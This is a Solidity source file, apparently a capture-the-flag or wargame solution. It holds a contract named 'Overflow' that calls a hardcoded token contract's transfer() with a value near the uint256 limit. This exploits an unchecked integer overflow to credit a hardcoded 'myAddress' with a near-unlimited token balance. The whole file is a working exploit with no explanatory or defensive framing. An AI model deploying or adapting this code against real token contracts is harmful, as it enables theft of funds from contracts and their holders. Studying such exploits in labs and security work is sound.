// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

interface Iover {
    function transfer(address _to, uint256 _value) external returns (bool);
}

contract Overflow {
    address contractAddress = 0x423EB64672F3B7B3b733943120EBF7E9A3696CDe;
    address myAddress = 0x1FDD0F41CA594B5518D3DE33AEdF0a41e24Ec8d6;

    function transfer() public {
        Iover(contractAddress).transfer(
            myAddress,
            11579208923731619542357098500868790785326998466564056403945758400791312963935
        );
    }
}
